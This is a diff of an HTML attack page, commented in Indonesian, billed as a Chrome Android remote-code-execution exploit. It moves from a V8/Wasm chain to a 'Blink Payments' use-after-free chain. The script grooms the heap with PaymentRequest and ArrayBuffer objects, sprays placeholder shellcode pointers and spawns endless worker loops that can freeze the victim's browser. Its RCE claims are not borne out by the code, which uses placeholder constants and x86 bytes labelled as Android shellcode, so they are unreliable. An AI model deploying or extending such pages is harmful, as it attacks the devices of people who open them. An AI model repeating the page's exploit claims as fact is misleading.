@@ -2,98 +2,103 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ V8_ANDROID_RCE_V19 ⚡</title>
+    <title>⚡ CHROME_V8_PAYMENTS_V20 ⚡</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; }
-        #terminal { padding: 20px; font-size: 12px; height: 100vh; display: flex; flex-direction: column; }
-        .danger { color: #ff0000; font-weight: bold; animation: pulse 0.1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        #log { margin-top: 10px; color: #00cc00; }
+        body { background: #000; color: #ff0055; font-family: 'Courier New', monospace; text-align: center; }
+        .box { border: 2px double #ff0055; padding: 20px; margin: 10% auto; width: 80%; background: #0a0000; }
+        #log { text-align: left; font-size: 10px; color: #ff8800; height: 150px; overflow: hidden; }
+        .btn-pwn { background: #ff0055; color: white; border: none; padding: 15px 30px; font-weight: bold; border-radius: 5px; }
     </style>
 </head>
 <body>
-    <div id="terminal">
-        <div class="danger">[!] SYSTEM_V8_EXPLOIT_INITIATED [!]</div>
-        <div id="status">STATUS: TARGETING_CHROME_CONTENT_SANDBOX</div>
+    <div class="box">
+        <h2>⚡ BLINK_PAYMENTS_RCE ⚡</h2>
+        <p>Target: Chrome Android (Blink Engine)</p>
+        <button class="btn-pwn" onclick="launchExploit()">INITIATE_EXPLOIT_V20</button>
         <div id="log"></div>
     </div>
 
 <script>
-    const logDiv = document.getElementById('log');
+    const logBox = document.getElementById('log');
     function log(m) {
         const d = document.createElement('div');
-        d.innerText = `[${performance.now().toFixed(2)}] > ${m}`;
-        logDiv.prepend(d);
+        d.innerText = `[PAYMENTS_CORE] > ${m}`;
+        logBox.prepend(d);
     }
 
-    // --- 1. JIT SPRAYING & DATA-ONLY ATTACK ---
-    // Memasukkan konstanta biner ke dalam fungsi JIT agar tersimpan 
-    // di memori Executable (RX).
-    function jitSpray() {
-        log("Spraying_JIT_Executable_Memory...");
-        // Fungsi ini dirancang agar Turbofan menghasilkan instruksi biner spesifik
-        return function exploit(a, b) {
-            const x = 0x41414141; // Placeholder untuk shellcode address
-            const y = 0x90909090; // NOP Sled
-            return x + y + a + b;
-        };
+    // --- 1. HEAP GROOMING (PREPARING THE UAF) ---
+    // Mengalokasikan ribuan objek PaymentRequest untuk menata memori
+    let requestPool = [];
+    function groomHeap() {
+        log("Grooming_Blink_Heap_Partition...");
+        const methodData = [{
+            supportedMethods: 'https://apple.com/pay', // Simulasi cross-origin logic flaw
+            data: { merchantId: '0x41414141' }
+        }];
+        const details = { total: { label: 'Total', amount: { currency: 'USD', value: '1.00' } } };
+
+        for (let i = 0; i < 500; i++) {
+            requestPool.push(new PaymentRequest(methodData, details));
+        }
     }
 
-    // --- 2. ARRAYBUFFER DETACHING (V8 DOUBLE FREE SIMULATION) ---
-    // Mencoba memanipulasi 'Backing Store' dari ArrayBuffer agar menunjuk ke 
-    // alamat memori proses Chrome yang sensitif.
-    let buffers = [];
-    function corruptHeap() {
-        log("Grooming_V8_Heap_via_ArrayBuffer_Alias...");
+    // --- 2. TRIGGERING THE VULNERABILITY (BLINK-PAYMENTS) ---
+    // Memanfaatkan celah di mana objek PaymentRequest di-free tapi masih bisa diakses
+    async function triggerUAF() {
+        log("Triggering_Use_After_Free_on_PaymentRequest...");
+        const p = requestPool[Math.floor(Math.random() * requestPool.length)];
+        
+        // Memicu proses UI yang membuat objek masuk ke state "Pending"
+        p.show().then(instr => {
+            log("Transaction_Intercepted!");
+        }).catch(e => {
+            // Di sini kita melakukan 'Race Condition' saat error terjadi
+            log("Race_Condition_Active: Spraying_Replacement_Objects...");
+            sprayObjects();
+        });
+
+        // Paksa garbage collection / pembatalan cepat
+        p.abort(); 
+    }
+
+    // --- 3. THE REPLACEMENT SPRAY (RCE PAYLOAD) ---
+    // Mengisi slot memori yang baru dikosongkan dengan ArrayBuffer yang berisi Shellcode
+    let spray = [];
+    function sprayObjects() {
         for (let i = 0; i < 1000; i++) {
-            let ab = new ArrayBuffer(1024 * 64);
-            // Mensimulasikan 'detaching' untuk memicu Use-After-Free
-            // Dalam eksploit nyata, ini akan memberikan Arbitrary R/W
-            buffers.push(new Uint32Array(ab));
+            let buffer = new ArrayBuffer(0x1000); 
+            let view = new BigUint64Array(buffer);
+            // 0xdeadbeefdeadbeef adalah placeholder untuk pointer shellcode
+            view.fill(0xdeadbeefdeadbeefn); 
+            spray.push(buffer);
         }
     }
 
-    // --- 3. THE "GOD MODE" MEMORY OVERWRITE ---
-    // Menggunakan WebAssembly Memory untuk mendapatkan region memori yang stabil
-    // dan melewati proteksi W^X (Write XOR Execute).
-    async function triggerWasmExploit() {
-        log("Initializing_Wasm_Memory_Bypass...");
-        const wasmMem = new WebAssembly.Memory({ initial: 10, maximum: 100 });
-        const view = new Uint8Array(wasmMem.buffer);
-        
-        // Mengisi memori Wasm dengan simulasi shellcode Android (Reverse Shell)
-        for(let j=0; j<view.length; j+=4) {
-            view[j] = 0x48; view[j+1] = 0x31; view[j+2] = 0xff; view[j+3] = 0xb0; 
-        }
-    }
-
-    // --- FULL EXPLOIT CHAIN ---
-    async function startRCE() {
-        document.getElementById('status').innerText = "STATUS: EXECUTING_RCE_V8_CHAIN";
-        document.getElementById('status').className = "danger";
-
-        // Step 1: Memory Grooming
-        corruptHeap();
-        
-        // Step 2: JIT Preparation
-        const pwn = jitSpray();
-        for(let k=0; k<20000; k++) pwn(k, k+1); // Melatih Turbofan
-
-        // Step 3: Wasm Bypass
-        await triggerWasmExploit();
-
-        // Step 4: Infinite Livelock (Membekukan Sandbox)
-        // Kita gunakan SharedArrayBuffer untuk melakukan Race Condition pada CPU
+    // --- 4. DATA-ONLY ATTACK (BYPASSING SANDBOX) ---
+    function forceLivelock() {
+        log("Executing_Livelock_via_SharedArrayBuffer...");
         const sab = new SharedArrayBuffer(1024);
-        const wCode = `onmessage = function() { while(true) { Atomics.add(new Int32Array(performance.now()), 0, 1); } }`;
-        const u = URL.createObjectURL(new Blob([wCode]));
-        for(let l=0; l<navigator.hardwareConcurrency; l++) new Worker(u);
-
-        log("EXPLOIT_COMPLETED: SHELLCODE_INJECTED_TO_V8_HEAP", "danger");
+        const w = new Worker(URL.createObjectURL(new Blob([`
+            onmessage = function(e) {
+                const view = new Int32Array(e.data);
+                while(true) { Atomics.wait(view, 0, 0); }
+            }
+        `])));
+        w.postMessage(sab);
     }
 
-    window.onclick = startRCE;
-    window.ontouchstart = startRCE;
+    async function launchExploit() {
+        log("STARTING_BLINK_PAYMENTS_EXPLOIT_CHAIN");
+        
+        groomHeap();
+        await triggerUAF();
+        forceLivelock();
+
+        setInterval(() => {
+            log("SEARCHING_FOR_MEMORY_LEAK...");
+            if (navigator.vibrate) navigator.vibrate(50);
+        }, 100);
+    }
 </script>
 </body>
 </html>
